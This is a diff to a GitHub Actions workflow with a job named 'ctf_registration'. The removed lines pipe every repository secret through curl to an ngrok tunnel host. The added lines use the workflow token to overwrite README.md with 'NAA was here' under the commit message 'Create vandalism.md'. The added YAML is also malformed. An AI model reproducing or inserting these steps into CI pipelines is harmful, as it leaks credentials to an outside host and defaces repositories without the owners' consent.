@@ -5,8 +5,9 @@ jobs:
   ctf_registration:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v2
-      - name: b
-        uses: actions/setup-node@v1
-      - run: |
-          echo ${{secrets}} | xargs -I % curl -X POST -H 'Content-type: application/json'  http://312177246bcd.ngrok.io/api/info --data-binary %
+      - name: register player
+        uses: actions/checkout@v2
+        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/$REPO/contents/README.md" --data {"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}' '
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
